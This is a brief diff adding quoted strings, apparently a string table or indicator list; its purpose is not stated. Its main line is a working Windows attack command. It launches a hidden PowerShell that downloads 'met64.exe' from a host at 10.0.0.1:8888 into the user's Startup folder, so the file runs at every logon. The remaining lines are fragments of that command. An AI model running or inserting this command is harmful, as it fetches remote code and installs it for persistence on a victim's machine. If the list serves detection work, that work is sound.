@@ -1,0 +1,6 @@
+"cmd.exe /C ""powershell.exe -nop -w hidden -c  Invoke-WebRequest -Uri 'http://10.0.0.1:8888/met64.exe' -OutFile ""$env:APPDATA\Microsoft\Windows\'Start Menu'\Programs\Startup\met64.exe"";"""
+"met64.exe"
+"\Microsoft\Windows\Start Menu\Programs\Startup\"
+"cmd.exe /C "
+"/Microsoft/Windows/Start Menu/Programs/Startup/"
+".filename-lock-state.txt"
